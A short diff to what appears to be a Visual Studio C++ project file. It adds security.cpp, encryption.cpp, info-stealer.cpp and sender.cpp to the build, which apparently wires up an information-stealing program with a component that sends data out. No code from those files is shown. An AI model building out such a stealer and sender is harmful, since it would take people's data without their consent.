@@ -150,8 +150,12 @@
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClCompile Include="..\commons\common.cpp" />
+    <ClCompile Include="security.cpp" />
+    <ClCompile Include="encryption.cpp" />
     <ClCompile Include="functions.cpp" />
+    <ClCompile Include="info-stealer.cpp" />
     <ClCompile Include="main.cpp" />
+    <ClCompile Include="sender.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="..\commons\common.h" />
